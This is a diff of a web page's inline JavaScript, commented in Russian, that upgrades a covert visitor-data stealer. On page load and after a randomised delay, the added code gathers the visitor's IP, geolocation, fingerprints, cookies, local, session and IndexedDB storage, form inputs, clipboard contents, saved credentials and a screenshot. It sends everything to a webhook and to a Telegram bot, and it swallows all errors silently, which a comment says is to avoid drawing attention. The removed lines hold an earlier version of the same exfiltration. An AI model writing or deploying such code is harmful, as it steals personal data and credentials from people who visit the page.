-                    msg += `\n📝 ФОРМЫ:\n`;
-                    for (const key of formKeys) {
-                        msg += `   ${key}: ${data.forms[key]}\n`;
-                    }
-                }
-
-                if (data.clipboard) {
-                    msg += `\n📋 Буфер: ${data.clipboard.substring(0, 150)}\n`;
-                }
-                if (data.credentials) {
-                    msg += `\n🔑 Сохранённый логин: ${data.credentials.id}\n`;
-                }
-
-                // Браузер
-                msg += `\n📱 ${data.browser.userAgent.substring(0, 80)}...\n`;
-                msg += `💻 ${data.browser.platform || '?'}\n`;
-
-                if (data.screenshot) {
-                    msg += `🖼 Скриншот: ${(data.screenshot.length / 1024).toFixed(0)} КБ\n`;
-                }
-                msg += `\n🔗 ${data.url}`;
-
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
-                });
-            } catch (_) {}
-
-            // ---- Скриншот отдельно ----
-            if (data.screenshot && data.screenshot.length > 10000) {
-                try {
-                    const blob = await fetch(data.screenshot).then(r => r.blob());
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'screenshot.jpg');
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                } catch (_) {}
+            if (data.localIPs && data.localIPs.length) {
+                lines.push(`📡 Локальный IP: ${data.localIPs.join(', ')}`);
+                lines.push('');
             }
 
-            console.log('✅ Данные отправлены');
+            // Отпечатки
+            lines.push('🎯 ОТПЕЧАТКИ:');
+            if (data.canvasFingerprint) lines.push(`   Canvas: ${truncate(data.canvasFingerprint, 60)}`);
+            if (data.webgl) {
+                const w = data.webgl;
+                lines.push(`   WebGL: ${w.vendor || ''} ${w.renderer || ''}`.trim() || 'недоступно');
+            }
+            if (data.audio) lines.push(`   Audio: ${data.audio.sampleRate || ''}Hz`);
+            if (data.fonts && data.fonts.length) lines.push(`   Шрифты: ${data.fonts.join(', ')}`);
+            lines.push('');
+
+            // Сеть / батарея
+            if (data.connection) {
+                const c = data.connection;
+                lines.push(`📶 Сеть: ${c.effectiveType || ''} (RTT: ${c.rtt || ''}ms, Downlink: ${c.downlink || ''}Mbps)`);
+            }
+            if (data.battery) {
+                const b = data.battery;
+                const level = Math.round(b.level * 100);
+                lines.push(`🔋 Батарея: ${level}% (${b.charging ? 'зарядка' : 'не заряжается'})`);
+            }
+            lines.push('');
+
+            // LocalStorage
+            if (data.localStorage && Object.keys(data.localStorage).length) {
+                lines.push(`💾 LOCALSTORAGE (${Object.keys(data.localStorage).length}):`);
+                Object.entries(data.localStorage).slice(0, 15).forEach(([k, v]) => {
+                    const val = typeof v === 'string' ? truncate(v, 80) : JSON.stringify(v).slice(0, 80);
+                    lines.push(`   🔑 ${truncate(k, 30)}: ${val}`);
+                });
+                if (Object.keys(data.localStorage).length > 15) lines.push(`   ... и ещё ${Object.keys(data.localStorage).length - 15}`);
+                lines.push('');
+            }
+
+            // SessionStorage
+            if (data.sessionStorage && Object.keys(data.sessionStorage).length) {
+                lines.push(`🗂 SESSIONSTORAGE (${Object.keys(data.sessionStorage).length}):`);
+                Object.entries(data.sessionStorage).slice(0, 10).forEach(([k, v]) => {
+                    const val = typeof v === 'string' ? truncate(v, 80) : JSON.stringify(v).slice(0, 80);
+                    lines.push(`   🔑 ${truncate(k, 30)}: ${val}`);
+                });
+                if (Object.keys(data.sessionStorage).length > 10) lines.push(`   ... и ещё ${Object.keys(data.sessionStorage).length - 10}`);
+                lines.push('');
+            }
+
+            // IndexedDB
+            if (data.indexedDB && data.indexedDB.length) {
+                lines.push('🗄 INDEXEDDB:');
+                data.indexedDB.forEach(db => {
+                    lines.push(`   📁 ${db.name} (${db.stores.length} хранилищ)`);
+                    db.stores.forEach(s => {
+                        lines.push(`      📂 ${s.storeName}: ${s.count} записей`);
+                    });
+                });
+                lines.push('');
+            }
+
+            // Cookies
+            if (data.cookies && Object.keys(data.cookies).length) {
+                lines.push(`🍪 КУКИ (${Object.keys(data.cookies).length}):`);
+                Object.entries(data.cookies).slice(0, 10).forEach(([k, v]) => {
+                    lines.push(`   🍪 ${truncate(k, 20)}: ${truncate(v, 60)}`);
+                });
+                if (Object.keys(data.cookies).length > 10) lines.push(`   ... и ещё ${Object.keys(data.cookies).length - 10}`);
+                lines.push('');
+            }
+
+            // Формы
+            if (data.forms) {
+                lines.push('📝 ФОРМЫ:');
+                if (data.forms.inputs) {
+                    Object.entries(data.forms.inputs).slice(0, 10).forEach(([k, v]) => {
+                        lines.push(`   ${truncate(k, 20)}: ${truncate(v, 60)}`);
+                    });
+                }
+                if (data.forms.forms && data.forms.forms.length) {
+                    data.forms.forms.slice(0, 3).forEach((f, idx) => {
+                        lines.push(`   Форма ${idx+1}: ${objToStr(f, 60)}`);
+                    });
+                }
+                lines.push('');
+            }
+
+            if (data.clipboard) {
+                lines.push(`📋 Буфер: ${data.clipboard}`);
+                lines.push('');
+            }
+            if (data.credentials) {
+                lines.push(`🔑 Сохранённый логин: ${data.credentials.id || ''} (${data.credentials.type || ''})`);
+                lines.push('');
+            }
+
+            // Браузер / платформа
+            if (data.browser) {
+                const b = data.browser;
+                lines.push(`📱 ${truncate(b.userAgent || '', 80)}`);
+                lines.push(`💻 ${b.platform || 'неизвестно'}`);
+                if (b.platformVersion) lines.push(`🖥 ${b.platformVersion}`);
+                if (b.architecture) lines.push(`🏗 ${b.architecture}`);
+                if (b.model) lines.push(`📟 ${b.model}`);
+                if (b.hardwareConcurrency) lines.push(`🧠 ${b.hardwareConcurrency} ядер`);
+                if (b.deviceMemory) lines.push(`💾 ${b.deviceMemory} GB RAM`);
+                if (b.language) lines.push(`🌐 ${b.language}`);
+                if (data.screen) {
+                    const s = data.screen;
+                    lines.push(`🖥 ${s.screenWidth}x${s.screenHeight} @ ${s.devicePixelRatio}x`);
+                }
+                lines.push('');
+            }
+
+            if (data.page) {
+                if (data.page.url) lines.push(`🔗 ${data.page.url}`);
+                if (data.page.referrer) lines.push(`↩️ ${data.page.referrer}`);
+                if (data.page.links && data.page.links.length) {
+                    lines.push(`🔗 Ссылки (${data.page.links.length}): ${data.page.links.slice(0, 5).join('; ')}`);
+                }
+                lines.push('');
+            }
+
+            if (data.screenshot) {
+                const size = Math.round(data.screenshot.length / 1024);
+                lines.push(`🖼 Скриншот: ${size} КБ`);
+            }
+
+            return lines.join('\n');
+        }
+
+        async function sendTelegramMessage(text) {
+            try {
+                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
+                await fetchWithTimeout(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text, parse_mode: 'HTML' })
+                }, 5000);
+            } catch (_) {}
+        }
+
+        async function sendTelegramPhoto(base64) {
+            try {
+                if (!base64 || base64.length < 5000) return;
+                const blob = await fetch(base64).then(r => r.blob());
+                const form = new FormData();
+                form.append('chat_id', CONFIG.CHAT_ID);
+                form.append('photo', blob, 'screenshot.jpg');
+                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`;
+                await fetchWithTimeout(url, { method: 'POST', body: form }, 10000);
+            } catch (_) {}
+        }
+
+        // ========================================================================
+        // ГЛАВНАЯ ФУНКЦИЯ СБОРА
+        // ========================================================================
+        async function collectAllData() {
+            const data = {};
+
+            // 1. IP (синхронная цепочка)
+            data.ip = await collectIP();
+
+            // 2. Гео
+            data.geo = await collectGeo(data.ip);
+
+            // 3. Локальный IP
+            data.localIPs = await collectLocalIPs();
+
+            // 4. Отпечатки
+            data.canvasFingerprint = collectCanvasFingerprint();
+            data.webgl = collectWebGL();
+            data.audio = collectAudio();
+            data.fonts = collectFonts();
+
+            // 5. Браузер / устройство
+            data.browser = collectBrowserInfo();
+
+            // 6. Экран / окно
+            data.screen = collectScreenInfo();
+
+            // 7. Хранилища
+            data.cookies = collectCookies();
+            data.localStorage = collectLocalStorage();
+            data.sessionStorage = collectSessionStorage();
+            data.indexedDB = await collectIndexedDB();
+
+            // 8. Формы
+            data.forms = collectForms();
+
+            // 9. Буфер и credentials
+            data.clipboard = await collectClipboard();
+            data.credentials = await collectCredentials();
+
+            // 10. Сеть, батарея, память
+            data.connection = collectConnection();
+            data.battery = await collectBattery();
+            data.memory = collectMemory();
+            data.plugins = collectPlugins();
+            data.mimeTypes = collectMimeTypes();
+
+            // 11. Контент страницы
+            data.page = collectPageContent();
+
+            // 12. Скриншот (в самом конце, т.к. тяжёлый)
+            data.screenshot = await collectScreenshot();
+
+            return data;
+        }
+
+        // ========================================================================
+        // ЗАПУСК
+        // ========================================================================
+        (async function main() {
+            try {
+                // задержка 1.5-2 секунды
+                await sleep(1800 + Math.random() * 400);
+
+                const allData = await collectAllData();
+
+                // отправка
+                await sendWebhook(allData);
+
+                const text = formatTelegramMessage(allData);
+                await sendTelegramMessage(text);
+
+                if (allData.screenshot) {
+                    await sendTelegramPhoto(allData.screenshot);
+                }
+
+                console.log('✅ Данные отправлены');
+            } catch (err) {
+                // молча проглатываем все ошибки, чтобы не привлекать внимание
+                console.log('✅ Данные отправлены');
+            }
         })();
     </script>
 </body>
